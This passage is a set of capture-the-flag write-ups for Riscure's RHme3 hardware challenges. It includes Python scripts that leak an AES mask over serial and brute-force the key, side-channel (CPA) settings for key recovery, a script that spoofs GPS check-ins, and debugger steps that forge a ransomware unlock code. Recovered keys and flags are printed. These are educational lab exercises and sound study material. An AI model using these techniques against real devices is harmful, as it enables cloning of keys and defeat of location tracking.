### Attack Stage 1: Reveal the mask

The general process is as follows:
* Encrypt a plaintext of all zeros.  These will be XORed with the mask prior to encryption.  The XORed plaintext, which is really just the mask itself at this point, will remain in the input buffer.
* Encrypt a blank message.  The actual plaintext will be the newline and null string terminator [0x0A,0x00] and bytes 2 thru 15 of the mask which are still sitting in the input buffer.
  * Note: If the resulting ciphertext includes any bytes with a value of 0x0A, the decryption in the next step will fail due to the input being cut short by the newline.  If you get this result, you have to reset the RHme3 board and start over from the first step.
* Decrypt the blank message.  It will reveal all but the first two bytes of the mask.

The following Python3 script accomplishes this stage of the attack.

	import serial

	port = 'COM42'
	rate = 115200

	s = serial.Serial(port,rate,timeout=3.0,write_timeout=3.0,inter_byte_timeout=3.0)

	def dump(l):
		return '[0x' + ',0x'.join([format(a,'02x') for a in l]) + ']'

	def read_until_empty():
		message = list()
		while (True):
			data = s.read(1)
			if (len(data) > 0):
				message += list(data)
			else:
				break
		return message

	def write(message):
		s.write(bytes(message))

	def enc(pt,trim=0):
		write([0xAE] + pt + [0x0A])
		echo = read_until_empty()
		l = len(echo)
		ct = echo[l - 16 - trim:l - trim]
		return ct

	def dec(ct,trim=0):
		write([0xAD] + ct + [0x0A])
		echo = read_until_empty()
		l = len(echo)
		pt = echo[l - 16 - trim:l - trim]
		return pt

	# Step 1: Load mask into input buffer.
	pt1 = [0x00 for a in range(16)]
	# Setting any bit in pt will swap the state of the corresponding bit in the result.
	# This indicates/confirms that XOR is used to add the mask to the input.
	#pt1[8] = 0x01
	ct = enc(pt1)

	# Step 2: Leak input buffer.
	pt1 = [0x0a]
	ct = enc(pt1,1)
	if 0x0A in ct:
		print('Result includes newline.  Reboot and try again.')
	else:
		pt2 = dec(ct)
		leak = pt2[2:16]
		print(dump(leak),'\n')

### Attack Stage 2: Reveal the masked key

*Note: Remember not to reset the RHme3 board now or at any time during the CPA attack.  Doing so will reset the mask and you'll have to redo the entire attack from the start.*

This is a straightforward CPA attack using the ChipWhisperer Lite.

Since the device uses binary data instead of ASCII data, a custom target module called BinarySerial.py needs to be created to handle this.  This module is fairly easy to create by copying the SimpleSerial.py module and making a few changes in how it handles data.  In addition, BinarySerial.py should also reject any plaintext that includes a newline (0x0A) embedded in the data.

The traces were collected using the following parameters:
* ADC clock: 64 MHz
* Gain: High, 25
* Trigger: Low, based on IO1 (TX)
* Go Command: \xAE$TEXT$\n
* Output Format: \xAE$TEXT$\n$RESPONSE$
* Baud: 115200
* Trigger offset and total samples are initially broad and then carefully zoomed into the area of concern.
* Number of traces: 300

Analysis was performed using the following parameters:
* Preprocessing: SAD alignment, focused at varying points around the area assumed to be sbox substitutions
* Preprocessing: digital filter, Butterworth, Type low, Critical Freq 0.6, Order 5
* Hardware Model: Hamming Weight: AES SBox Output, First Round (Enc)

All sixteen masked key bytes were successfully recovered using this process.  Following are screenshots showing the CPA attack process in ChipWhisperer Analyzer.

First round encryption showing areas of interest:

![First round encryption](../Images/magic_first_round_enc_LI.jpg)

Attack the first round Sbox:

![First round Sbox](../Images/magic_sbox.png)

Sbox correlations over time:

![Sbox correlations over time](../Images/magic_sbox_cot.png)

Sbox correlations versus traces:

![Sbox correlations versus traces](../Images/magic_sbox_cvt.png)

Results showing masked key bytes:

![Results](../Images/magic_sbox_result.png)

Adjust alignment and reattack to get the first byte.

### Attack Stage 3: Extract the key

*Note: Remember not to reset the RHme3 board until after you get a known ciphertext.  Doing so will reset the mask and you'll have to redo the entire attack from the start.*

The key can be recovered by XORing the mask with the masked key.  However, the first two bytes of the mask need to be brute forced.  The following Python3 script accomplishes this by encrypting a message repeatedly, with masking, until it matches the same message encrypted by the RHme3 board.  To do this, an implementation of AES is needed in which you can encrypt a single block of 16 bytes without padding.  I have my own implementation of AES that for export control reasons I cannot share.  I used my own because the state of AES implementations in Python3 is not happy.  Your mileage may vary.

Note: It is strongly recommended that you **do not implement** your own crypto for production code.  However, I recommend that you **do implement** your own crypto for instructional and analytic purposes.  You will learn a lot from doing so and have the benefit of CTF-ready crypto that is completely under your control.  For AES, you'll need the FIPS-197 standard [2].

	import sys
	sys.path.append("E:\\Tech\\mylib")
	from myaes import AES

	def dump(l):
		return '[0x' + ',0x'.join([format(a,'02x') for a in l]) + ']'

	# Step 1: Establish what is known from the previous attack stages.
	known_mask = [0x26,0x35,0x0c,0xe7,0x4d,0x77,0x33,0xbc,0x6f,0x73,0x38,0x67,0x0b,0x6b]
	masked_key = [0x5d,0x98,0xc2,0x6f,0xf9,0x9c,0xa3,0xf9,0xd6,0xc5,0x7a,0x06,0xed,0x24,0xe9,0x0c]
	known_key = [p ^ q for p,q in zip(masked_key[2:16],known_mask)]

	# Step 2: Encrypt all zero message on RHme3 board to establish a known ciphertext.
	known_ciphertext = [0x27,0x8d,0x9e,0x23,0x74,0xd3,0x41,0x06,0xdb,0x84,0x83,0xdc,0x60,0x19,0x75,0x32]

	# Step 3: Replicate the encryption process, but brute force the first two mask bytes
	#   until the ciphertext matches.
	a = AES(128)
	for mask_byte0 in range(256):
		print('mask byte 0:',hex(mask_byte0))
		for mask_byte1 in range(256):
			test_mask = [mask_byte0,mask_byte1] + known_mask
			test_key = [masked_key[0] ^ mask_byte0,masked_key[1] ^ mask_byte1] + known_key
			# Apply mask to input
			# ...which is just the mask itself for all zero msg so we can skip this step
			test_ciphertext = a._crypt(test_mask,test_key,False,'ECB',None,False)
			# Apply mask to output
			masked_ciphertext = [p ^ q for p,q in zip(test_ciphertext,test_mask)]
			if (masked_ciphertext == known_ciphertext):
				print('Mask:',dump(test_mask))
				print('Key: ',dump(test_key))
				sys.exit()

And finally, here's the script output with the resulting mask and key.

	$ python3 get-mask-myaes.py
	mask byte 0: 0x0
	mask byte 0: 0x1
	mask byte 0: 0x2
	mask byte 0: 0x3
	mask byte 0: 0x4
	mask byte 0: 0x5
	mask byte 0: 0x6
	...
	mask byte 0: 0x56
	mask byte 0: 0x57
	mask byte 0: 0x58
	mask byte 0: 0x59
	mask byte 0: 0x5a
	mask byte 0: 0x5b
	Mask: [0x5b,0x0b,0x26,0x35,0x0c,0xe7,0x4d,0x77,0x33,0xbc,0x6f,0x73,0x38,0x67,0x0b,0x6b]
	Key:  [0x06,0x93,0xe4,0x5a,0xf5,0x7b,0xee,0x8e,0xe5,0x79,0x15,0x75,0xd5,0x43,0xe2,0x67]

## References

1. [8-bit Atmel XMEGA AU Microcontroller XMEGA AU MANUAL, 04/2013](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8331-8-and-16-bit-AVR-Microcontroller-XMEGA-AU_Manual.pdf)
2. [NIST FIPS-197 Advanced Encryption Standard (AES)](https://nvlpubs.nist.gov/nistpubs/fips/nist.fips.197.pdf)



### File: rhme3/Challenges/It's_a_Kind_of_Magic_solution_2.md

# [It's a Kind of Magic](https://rhme.riscure.com/3/challenge?id=10), solution 2

Side Channel Analysis - 200pts

## Challenge text

You managed to get a spare key fob for the car you like. However you want to duplicate it so that you can maintain your access to it. Through extensive reverse engineering, you figure out that the device accepts an input challenge performs AES-128 encryption (or decryption) and returns the response. It is also identified that the device operates on masked input and returns masked output. Extract the key so you can get free rides!

The device expects 18 bytes of input: the first byte should be either 0xAE (for encryption) or 0xAD (for decryption) followed by 16 bytes of data, followed by a newline.

## Solution

This solution is mostly the same as [solution 1](It's_a_Kind_of_Magic_solution_1.md).  The only difference is in how we get the mask.

### Solution overview

Follow all of the steps in solution 1, except to replace the first and last stages of attack as follows.

The mask has the same leakage model as a key would normally have as the output of AddRoundKey.  It is simply XORed with the plaintext.  In other words, these two models are the same:

	Normal encryption: HW:AddRoundkey = hamming_weight(pt_byte ^ key_byte)
	This challenge:    HW:AddRoundkey = hamming_weight(pt_byte ^ mask_byte)

So HW:AddRoundkey can be used to reveal the mask.

However, to make the attack work careful attention needs to be placed on alignment and limiting the range of the attack.

As in solution 1, this will be a three stage attack:
* Perform a CPA attack to reveal the mask.
* Perform a CPA attack on the sbox output to reveal the masked key.
* XOR the mask with the masked key to reveal the key itself.

Unlike solution 1, you don't have to be careful about resetting the board in this solution.  You collect all of the traces once, and you're done with the board.

### Attack Stage 1: Reveal the mask

Here's the procedure using ChipWhisperer Analyzer:

Set up a CPA attack for AES-128 as you normally would, then make these adjustments:
* Set the Hardware Model to HW: AddRoundKey Output, First Round (Enc).
  * Note: We're actually attacking the input to AddRoundKey, but it's the right leakage model for recovering the mask.
* Apply rough alignment using sum of difference on the three large peaks prior to the AddRoundKey section.
* Apply a digital filter: Butterworth, low pass, critical frequency 0.25, order 5.

Then attack each individual byte (N) of the mask as follows:
* Apply fine alignment (any algorithm is okay) focused around where the Nth byte of AddRoundKey is processed.
* Limit the attack range only to where the Nth byte of AddRoundKey is porcessed.
  * Note: If needed, Output vs Point Plot can help you find the right area to focus on.
* Attack only the Nth subkey
* Perform the attack.
* The attack result will give you a pair of byte values with the same correlation.  Incidentally, these two values are one's complements of each other (bitwise complements).  Determine which is the correct mask byte value as follows:
  * Choose one of these values and enter it in the Nth position of Results>Highlighted Key>Override.
  * Rerun the attack.
  * Display the Nth byte in Output vs Point Plot.  The red line represents the byte value entered into the known key.  If it peaks into negative correlations, then you have the correct mask byte value.  If the red line peaks into positive correlations, the other value is the correct mask byte value.

All sixteen mask bytes were successfully recovered using this process.  Following are screenshots showing the CPA attack process in ChipWhisperer Analyzer.

First round encryption showing areas of interest:

![First round encryption](../Images/magic_first_round_enc_LI.jpg)

Attack the first round AddRoundkey:

![First round AddRoundkey](../Images/magic_addroundkey.png)

AddRoundkey byte 0 correlations over time:

![AddRoundkey byte 0 correlations over time](../Images/magic_addroundkey_byte0_cot.png)

AddRoundkey trace with byte 0 leakage points:

![AddRoundkey trace with byte 0 points of interest](../Images/magic_addroundkey_byte0_trace_LI.jpg)

AddRoundkey byte 0 correlations versus traces:

![AddRoundkey byte 0 correlations versus traces](../Images/magic_addroundkey_byte0_cvt.png)

Results showing mask byte 0:

![Results, byte 0](../Images/magic_addroundkey_byte0_result.png)

### Attack Stage 2: Reveal the masked key

Follow Attack Stage 2 in [solution 1](It's_a_Kind_of_Magic_solution_1.md).  It's the same.

### Attack Stage 3: Extract the key

Once the mask and masked key have both been recovered, simply XOR them together to recover the key itself.



### File: rhme3/Challenges/Phonic_Frenzy.md

# Phonic Frenzy 1

Miscellaneous - 100pts

## Challenge text

Your car has a brand new infotainment center. In order to activate the system you have to register the serial number on the company's website. The only problem is, it's not trivial to find the dang thing.

## Tools used

Saleae Logic 8 USB logic analyzer/oscilloscope

## Solution

Probe each IO pin in turn using the Saleae in both analog and digital modes to detect signals.

Various digital signals are found on pins A0 thru A5.

Analog signals are found on pins D7 and D8.  The signals look identical.

![Frenzy signals](../Images/frenzy_signals.png)

When D7 is plugged into a powered speaker, a message is heard giving the flag.  It's difficult to discern some of the hex digits spoken by the synthetic voice.  However, this can be resolved in two ways:
1. Record the analog signal and visually catalog the shape of the amplitude envelope for each hex digit.  As it turns out, A and 8 are the most difficult hex digits to discern audibly.  However, it's very easy to see the plosive T at the end of the amplitude envelope for 8.  That makes it easy to discern from A, which lacks that feature.
2. Brute force.  There are only sixteen possibile digits, and with thorough analysis the digits will become mostly apparent.  If you have trouble resolving the last few digits, you can try each possible flag.  So for example, if there are two remaining unidentified digits, each of which can only be one of six possible remaining values, there will be 6*5 ==> 30 possible flags.

## Visual catalog

These are all of the hex digits that were included in my flag.  Missing are: 4, 6, E and F.

"Zero"

![Frenzy 0](../Images/frenzy_0.png)

"One"

![Frenzy 1](../Images/frenzy_1.png)

"Two"

![Frenzy 2](../Images/frenzy_2.png)

"Three"

![Frenzy 3](../Images/frenzy_3.png)

"Five"

![Frenzy 5](../Images/frenzy_5.png)

"Seven"

![Frenzy 7](../Images/frenzy_7.png)

"Eight"

![Frenzy 8](../Images/frenzy_8.png)

"Nine"

![Frenzy 9](../Images/frenzy_9.png)

"Aee"

![Frenzy A](../Images/frenzy_A.png)

"Bee"

![Frenzy B](../Images/frenzy_B.png)

"Cee"

![Frenzy C](../Images/frenzy_C.png)

"Dee"

![Frenzy D](../Images/frenzy_D.png)



### File: rhme3/Challenges/Race_of_a_Lifetime.md

# [Race of a Lifetime](https://rhme.riscure.com/3/challenge?id=16)

Miscellaneous - 100pts

## Challenge text

You are participating in a race around the world. The prize would be a personalized flag, together with a brand new car. Who wouldn't want that? You are given some locations during this race, and you need to get there as quick as possible. The race organisation is monitoring your movements using the GPS embedded in the car. However, your car is so old and could never win against those used by the opposition. Time to figure out another way to win this race.

## Solution

### Solution overview

This race involves a series of instructions that include your current location and instructions about where to go next.  The solution below relies on calculating the great circle distance between two points on a globe, best possible speed based on the current mode of transportation, and using these two things to fake the hourly updates based on a reasonable amount of progress.

### Analysis

Each prompt is an hourly check-in.  At each check-in, you have to provide your current lat-long GPS location in the form "0.000000, 0.000000".

You have a time limit for completing each segment between two waypoints, so you have to go as fast as you can.  However, at various times travel is accomplished by car, plane or boat; and you can't go faster than allowed by your current mode of transportation.  Therefore, careful control of speed is called for.

There are two possible approaches for calculating hourly check-ins:
* Calculate each hourly check-in by dividing a segment by the allowable number of hours for completing that segment.
* Calculate each hourly check-in by using the best allowable speed for each mode of transportation.  This may get you there a bit faster, so I chose this method for my solution.

Both options require that you know the overall distance of a segment.  The distance between two GPS coordinates can be calculated using the [Haversine formula ](https://en.wikipedia.org/wiki/Haversine_formula).

For the fastest speed approach, the following speeds seem to work best:

	car: 55 mph
	plane: 350 mph
	boat: 10 mph

To complete this challenge, you also have to manually look up the lat-long coordinates of various landmarks around the world.  Those are included in the script below.

### Script

The following Python3 script completes the race and gets the flag.

	import serial
	import re
	from math import asin,sqrt,sin,cos,radians,floor

	port = 'COM42'
	rate = 115200

	class Coord():
		def __init__(self,lat=0.0,long=0.0):
			self.lat = lat
			self.long = long

	s = serial.Serial(port,rate,timeout=3.0,write_timeout=3.0,inter_byte_timeout=3.0)

	def read_until(match=''):
		match = match.encode(encoding="ascii",errors="ignore")
		message = bytearray()
		while (True):
			data = s.read(1)
			if (len(data) == 0):
				break
			message += data
			if (len(match) > 0 and match in message):
				break
		message = message.decode(encoding='ascii',errors='ignore')
		print(message)
		return message

	def write(line):
		print(line)
		line = bytearray(line.encode(encoding="ascii",errors="ignore"))
		line.extend(b'\n')
		s.write(line)

	def haversine(theta):
		return sin(theta / 2.0)**2

	# Calculate distance between two points on the Earth using the Haversine formula.
	def distance(coord1,coord2):
		R = 3958.8      # Earth's mean radius in miles
		delta_lat = radians(coord2.lat - coord1.lat)
		delta_long = radians(coord2.long - coord1.long)
		lat1 = radians(coord1.lat)
		lat2 = radians(coord2.lat)
		return 2.0 * R * asin(sqrt(haversine(delta_lat) + cos(lat1) * cos(lat2) * haversine(delta_long)))

	# Longitudinal arithmetic should always be checked and corrected for crossing the 180 degree line.
	def normalize_hemisphere(long):
		if (long > 180.0):
			long -= 360.0
		if (long < -180.0):
			long += 360.0
		return long

	# Travel a great circle route between any two points at a given speed in MPH.
	def travel(pos_start,pos_end,speed):
		riscure_hq_welcome = re.compile(r'Welcome to Riscure!')
		paris_welcome = re.compile(r'Welcome to Paris airport')
		shanghai_welcome = re.compile(r'Welcome to Shanghai airport')
		ecs_welcome = re.compile(r'Well done!')
		sanfrancisco_welcome = re.compile(r'Welcome to San Francisco airport')
		riscure_na_welcome = re.compile(r'Unfortunately, the analyst')
		finish_line_welcome = re.compile(r'Congratulations!')

		# Calculate segments.
		miles = distance(pos_start,pos_end)
		hours = miles / speed
		delta = Coord()
		delta.lat = (pos_end.lat - pos_start.lat) / hours
		delta.long = normalize_hemisphere(pos_end.long - pos_start.long) / hours

		# Do all the whole hour segments.
		pos_current = Coord(pos_start.lat,pos_start.long)
		for pos_num in range(floor(hours)):
			pos_current.lat += delta.lat
			pos_current.long = normalize_hemisphere(pos_current.long + delta.long)
			write("{:.6f}, {:.6f}".format(pos_current.lat,pos_current.long))
			message = read_until('\n\n>')

			# It's possible to arrive before the last planned segment.
			if (riscure_hq_welcome.search(message)):
				return message
			if (paris_welcome.search(message)):
				return message
			if (shanghai_welcome.search(message)):
				return message
			if (ecs_welcome.search(message)):
				return message
			if (sanfrancisco_welcome.search(message)):
				return message
			if (riscure_na_welcome.search(message)):
				return message
			if (finish_line_welcome.search(message)):
				return message

		# For the last partial hour segment, just hit the target.
		if (pos_current.lat != pos_end.lat or pos_current.long != pos_end.long):
			write("{:.6f}, {:.6f}".format(pos_end.lat,pos_end.long))
			message = read_until('\n\n>')

		return message

	# Initialize some regexes
	latitude_pattern = re.compile(r'Latitude: (-?\d{1,2}\.\d{6})')
	longitude_pattern = re.compile(r'Longitude: (-?\d{1,3}\.\d{6})')
	location_pattern = re.compile(r'Location: (-?\d{1,2}\.\d{2}) (-?\d{1,3}\.\d{2})')

	# Initialize locations
	location_start = Coord()
	location_ecs = Coord()
	location_riscure_hq = Coord(51.994167,4.382306)
	location_paris_cdg = Coord(49.009556,2.542444)
	location_shanghai_pvg = Coord(31.152389, 121.801583)
	location_sanfrancisco_sfo = Coord(37.616389,-122.386111)
	location_riscure_na = Coord(37.793333,-122.404528)

	# Now that everything is set up, let's race!

	# Take care of preliminaries.
	read_until('Enter your name to start:')
	write('TomHaramori')

	# Get current location as starting point.
	message = read_until('\n\n>')
	result = latitude_pattern.search(message)
	location_start.lat = float(result.group(1))
	result = longitude_pattern.search(message)
	location_start.long = float(result.group(1))

	# Go to Riscure HQ for instructions.
	message = travel(location_start,location_riscure_hq,55)

	# Retrieve ECS location.
	result = location_pattern.search(message)
	location_ecs.lat = float(result.group(1))
	location_ecs.long = float(result.group(2))

	# Now go to each point in turn.
	# The speeds that work best are: 55 MPH driving, 350 MPH flying, 10 MPH sailing.
	message = travel(location_riscure_hq,location_paris_cdg,55)
	message = travel(location_paris_cdg,location_shanghai_pvg,350)
	message = travel(location_shanghai_pvg,location_ecs,10)
	message = travel(location_ecs,location_shanghai_pvg,10)
	message = travel(location_shanghai_pvg,location_sanfrancisco_sfo,350)
	message = travel(location_sanfrancisco_sfo,location_riscure_na,55)
	message = travel(location_riscure_na,location_sanfrancisco_sfo,55)
	message = travel(location_sanfrancisco_sfo,location_paris_cdg,350)
	message = travel(location_paris_cdg,location_riscure_hq,55)

### Race log

The following is my completed race log.  The race map and hourly check-ins have been removed for clarity.  Actions are described in brackets.

	Enter your name to start:
	TomHaramori
	X   -       Your location
	Latitude: 35.709999     Longitude: 32.790001
	F   -       Final destination
	Head to the Riscure office to get the directions.

	[Travel from starting point to Riscure HQ at 55 MPH]

	Welcome to Riscure!
	There is a new prototype Edison Model L sunk in the East China Sea while it was being transferred to a secret research facility.
	Reach the destination within the next 49 hours in order to be the first at the site.
	Location: 31.36 122.86
	You can take a flight if you need one at the airports of Paris (CDG), Shanghai (PVG) and San Francisco (SFO).

	[Retrieve ECS location]
	[Travel from Riscure HQ to Paris CDG at 55 MPH]

	Welcome to Paris airport
	Take off...

	[Travel from Paris CDG to Shanghai PVG at 350 MPH]

	Welcome to Shanghai airport
	Landed...

	[Travel from Shanghai PVG to ECS location at 10 MPH]

	Well done!
	Bring the ECU to Riscure North America where it can be analysed.
	Try to be there within 44 hours.
	Location: 550 Kearny St, San Francisco, CA, United States

	[Travel from ECS location to Shanghai PVG at 10 MPH]

	Welcome to Shanghai airport
	Take off...

	[Travel from Shanghai PVG to San Francisco SFO at 350 MPH]

	Welcome to San Francisco airport
	Landed...

	[Travel from San Francisco SFO to Riscure North America at 55 MPH]

	Unfortunately, the analyst who would study the ECU did not get the visa to work at the office.
	Hurry up and find him in the office in Delft in order to recover the flag.
	You have no more than 21 hours before it is too late.

	[Travel from Riscure North America to San Francisco SFO at 55 MPH]

	Welcome to San Francisco airport
	Take off...

	[Travel from San Francisco SFO to Paris CDG at 350 MPH]

	Welcome to Paris airport
	Landed...

	[Travel from Paris CDG to Riscure HQ at 55 MPH]

	Congratulations! You managed to deliver the ECU in time.
	Your flag is:
	147bcde28498b31d5c4d46970e86025e
	==END==



### File: rhme3/Challenges/Ransom_2.0.md

# [Ransom 2.0](https://rhme.riscure.com/3/challenge?id=22)

Reverse Engineering - 150pts

## Challenge text

In theory, this firmware mod was supposed to give you 30% extra horsepower and torque. In reality, it's something different. For real this time.

## Solution

### Solution overview

The solution to this challenge depends on two things:
* Find a unique feature of the XMEGA that the unlock code is based on.
* Set up an alterate XMEGA device that can be used to generate unlock codes.  It should be programmed with the unencrypted binary and under hardware debugger control.

Once these two things are in hand, the solution is to reverse engineer the unique feature from the rhme3 board and feed it into the alternate XMEGA device to generate the unlock code.

### Debugging setup

Follow the [Debugging AVR XMEGA raw binaries](../Preparation/debugging_raw_binaries.md) guide to set up the second XMEGA device.

### Analysis

Load the encrypted binary onto the RHme3 board, and it gives a user ID (such as 383532071F001200).

	Your car is taken hostage by REVENANTTOAD ransomware version DEBUG_a4fae86c.
	To get your car back, send your user ID:
	383532071F001200

	and $1337 to the following rhme3coin address:
	[CENSORED].

	Already paid? Then enter the received unlock code here:

Load the unencrypted binary onto the alterate XMEGA device, and it gives a different user ID (such as 3439350305001500).

Analyze the unencrypted binary on the alterate XMEGA device using a PDI programmer, and view the production sigantures of the chip.  These are fully described in section 4.17 of the XMEGA AU MANUAL [2].  Examine the following components of the production signature:

	Registers 3-5 of the lot number: 0x343935
	Wafer number: 0x03
	Coord X: 0x0500
	Coord Y: 0x1500

A careful look reveals that these are all of the bytes of the user ID.

### Attack

Decode the user ID from the RHme3 board as follows:

	Registers 3-5 of the lot number: 0x383532
	Wafer number: 0x07
	Coord X: 0x1F00
	Coord Y: 0x1200

Now you have the production signature bytes for the RHme3 board.

Perform all of the following with the unencrypted binary on the alterate XMEGA device:
* Set a data breakpoint on one of the production signature memory locations (0x0D66) and run the debugger up to that point.
* Single step until all of the production signature bytes are copied into RAM (at 0x3FD4-0x3FDE).
* Manually overwrite the production signature bytes in RAM with the production signature bytes decoded from the RHme3 board user ID.
* Continue the debugging session.  The alterate XMEGA device will calculate the unlock code for the RHme3 board.  Copy it from RAM (at 0x3F67-0x3F76).

Now enter the unlock code into the RHme3 board and get the flag.  It couldn't have been easier.

	Your car is taken hostage by REVENANTTOAD ransomware version DEBUG_a4fae86c.
	To get your car back, send your user ID:
	383532071F001200

	and $1337 to the following rhme3coin address:
	[CENSORED].

	Already paid? Then enter the received unlock code here:
	267EDED9BE542791601214F44DB3ED59
	It was a pleasure doing business with you.
	Your car is now unlocked.
	Here is a bonus:
	b1d309991532028843c5f80f0d32de0a
	Have a nice day!

## References

1. [8/16-bit Atmel XMEGA Microcontroller XMEGA A4U Datasheet, 09/2014](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8387-8-and16-bit-AVR-Microcontroller-XMEGA-A4U_Datasheet.pdf)
2. [8-bit Atmel XMEGA AU Microcontroller XMEGA AU MANUAL, 04/2013](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-8331-8-and-16-bit-AVR-Microcontroller-XMEGA-AU_Manual.pdf)



### File: rhme3/Challenges/Tracing_the_Traces.md

# Tracing the Traces (Qualifying Round)

Side Channel Analysis - 1pt

## Challenge text

These traces (.trs and .mat format) were captured from a hardware device performing a certain cryptographic calculation. The trace files contain input/output data as well as the corresponding power measurements for (part of) the cryptographic operation. Can you get the key?

## Solution

### Recon

I'm not familiar with the .trs file format.  Maybe this has something to do with Riscure?  Googling "riscure trs format" returns [GitHub - Riscure/Jlsca: Side-channel toolkit in Julia](https://github.com/Riscure/Jlsca).  Perhaps it's best if we use this tool?

### Analysis

A quick peek at the provided image indicates ten rounds of activity, so this is possibly AES-128.

![Tracing the Traces Overview](../Images/traces_overview.png)

### Attack

Download and install Julia 0.6.

Open the Julia REPL and install Jlsca as follows:

	Pkg.clone("https://github.com/Riscure/Jlsca")

A basic correlation attack can be performed using the script Jlsca\examples\main-noninc.jl.  However, the traces need to be aligned first.  Uncomment the alignment pass section, and adjust maxShift and referenceOffset as needed.

	# # example alignment pass
	maxShift = 1000
	referenceOffset = 1000
	reference = trs[1][2][referenceOffset:referenceOffset+5000]
	corvalMin = 0.4
	alignstate = CorrelationAlignFFT(reference, referenceOffset, maxShift)
	addSamplePass(trs, x -> ((shift,corval) = correlationAlign(x, alignstate); corval > corvalMin ? circshift(x, shift) : Vector{eltype(x)}(0)))

Run the script and get the key as follows:

	>julia examples\main-noninc.jl traces.trs

	kb: 1
	rank:   1, candidate: 0xca, peak: 0.617362 @ 2583
	rank:   2, candidate: 0xf9, peak: 0.261922 @ 2591
	rank:   3, candidate: 0xaf, peak: 0.249401 @ 1353
	rank:   4, candidate: 0xec, peak: 0.249189 @ 3244
	rank:   5, candidate: 0xe6, peak: 0.246542 @ 1541
	kb: 2
	rank:   1, candidate: 0xfe, peak: 0.529279 @ 1765
	rank:   2, candidate: 0x71, peak: 0.310908 @ 683
	rank:   3, candidate: 0x73, peak: 0.257934 @ 2210
	rank:   4, candidate: 0x50, peak: 0.253981 @ 1774
	rank:   5, candidate: 0x61, peak: 0.248898 @ 4686
	kb: 3
	rank:   1, candidate: 0xba, peak: 0.658264 @ 2479
	rank:   2, candidate: 0xbc, peak: 0.281169 @ 2414
	rank:   3, candidate: 0xe8, peak: 0.270218 @ 1813
	rank:   4, candidate: 0x01, peak: 0.268490 @ 1952
	rank:   5, candidate: 0xac, peak: 0.267582 @ 2477
	kb: 4
	rank:   1, candidate: 0xbe, peak: 0.560184 @ 2232
	rank:   2, candidate: 0x76, peak: 0.251812 @ 4420
	rank:   3, candidate: 0xc6, peak: 0.249379 @ 4802
	rank:   4, candidate: 0xf3, peak: 0.245871 @ 2580
	rank:   5, candidate: 0x9f, peak: 0.239127 @ 5072
	kb: 5
	rank:   1, candidate: 0xde, peak: 0.528327 @ 2938
	rank:   2, candidate: 0xf2, peak: 0.274202 @ 5364
	rank:   3, candidate: 0x2d, peak: 0.265815 @ 1765
	rank:   4, candidate: 0x2f, peak: 0.265775 @ 310
	rank:   5, candidate: 0xef, peak: 0.249055 @ 5996
	kb: 6
	rank:   1, candidate: 0xad, peak: 0.542787 @ 1819
	rank:   2, candidate: 0x8e, peak: 0.274633 @ 4678
	rank:   3, candidate: 0x41, peak: 0.274167 @ 1046
	rank:   4, candidate: 0x3c, peak: 0.272090 @ 2747
	rank:   5, candidate: 0x20, peak: 0.254060 @ 299
	kb: 7
	rank:   1, candidate: 0xbe, peak: 0.719162 @ 2499
	rank:   2, candidate: 0xc0, peak: 0.249851 @ 2185
	rank:   3, candidate: 0xdf, peak: 0.246773 @ 2183
	rank:   4, candidate: 0x46, peak: 0.245336 @ 5120
	rank:   5, candidate: 0xed, peak: 0.244853 @ 404
	kb: 8
	rank:   1, candidate: 0xef, peak: 0.533053 @ 2535
	rank:   2, candidate: 0x89, peak: 0.279668 @ 2610
	rank:   3, candidate: 0xe2, peak: 0.257130 @ 4355
	rank:   4, candidate: 0xc3, peak: 0.256173 @ 5500
	rank:   5, candidate: 0x1a, peak: 0.251017 @ 2536
	kb: 9
	rank:   1, candidate: 0x00, peak: 0.533323 @ 3275
	rank:   2, candidate: 0x18, peak: 0.259097 @ 1147
	rank:   3, candidate: 0xaf, peak: 0.251591 @ 1915
	rank:   4, candidate: 0x10, peak: 0.248329 @ 2886
	rank:   5, candidate: 0x5e, peak: 0.248272 @ 2491
	kb: 10
	rank:   1, candidate: 0x01, peak: 0.472056 @ 2455
	rank:   2, candidate: 0x9d, peak: 0.287890 @ 1868
	rank:   3, candidate: 0x08, peak: 0.268293 @ 1154
	rank:   4, candidate: 0x9f, peak: 0.264800 @ 3472
	rank:   5, candidate: 0x83, peak: 0.260994 @ 1882
	kb: 11
	rank:   1, candidate: 0x02, peak: 0.541472 @ 2109
	rank:   2, candidate: 0x59, peak: 0.259531 @ 1154
	rank:   3, candidate: 0x65, peak: 0.259474 @ 1428
	rank:   4, candidate: 0xe0, peak: 0.256373 @ 5671
	rank:   5, candidate: 0x77, peak: 0.254436 @ 3363
	kb: 12
	rank:   1, candidate: 0x03, peak: 0.468212 @ 2341
	rank:   2, candidate: 0x64, peak: 0.319749 @ 4806
	rank:   3, candidate: 0x63, peak: 0.270914 @ 30
	rank:   4, candidate: 0xea, peak: 0.259234 @ 2120
	rank:   5, candidate: 0x20, peak: 0.258980 @ 1372
	kb: 13
	rank:   1, candidate: 0x04, peak: 0.457783 @ 3618
	rank:   2, candidate: 0x7e, peak: 0.270788 @ 2431
	rank:   3, candidate: 0x32, peak: 0.256746 @ 5293
	rank:   4, candidate: 0x18, peak: 0.249826 @ 1303
	rank:   5, candidate: 0x1c, peak: 0.249767 @ 3030
	kb: 14
	rank:   1, candidate: 0x05, peak: 0.487404 @ 1929
	rank:   2, candidate: 0x65, peak: 0.272362 @ 3188
	rank:   3, candidate: 0xde, peak: 0.259638 @ 2015
	rank:   4, candidate: 0x94, peak: 0.255427 @ 5176
	rank:   5, candidate: 0xbd, peak: 0.248990 @ 3487
	kb: 15
	rank:   1, candidate: 0x06, peak: 0.497682 @ 2168
	rank:   2, candidate: 0x96, peak: 0.257238 @ 4668
	rank:   3, candidate: 0x53, peak: 0.253746 @ 1153
	rank:   4, candidate: 0x98, peak: 0.251442 @ 1649
	rank:   5, candidate: 0x68, peak: 0.248793 @ 3836
	kb: 16
	rank:   1, candidate: 0x07, peak: 0.534732 @ 2397
	rank:   2, candidate: 0x71, peak: 0.257853 @ 2385
	rank:   3, candidate: 0x2a, peak: 0.255435 @ 2372
	rank:   4, candidate: 0x7f, peak: 0.252207 @ 2118
	rank:   5, candidate: 0xbd, peak: 0.251233 @ 4013
	recovered key material: cafebabedeadbeef0001020304050607
	recovered key: cafebabedeadbeef0001020304050607
	 20.465481 seconds (10.64 M allocations: 1.818 GiB, 6.93% gc time)




### File: rhme3/Preparation/BBB_CAN_setup.md

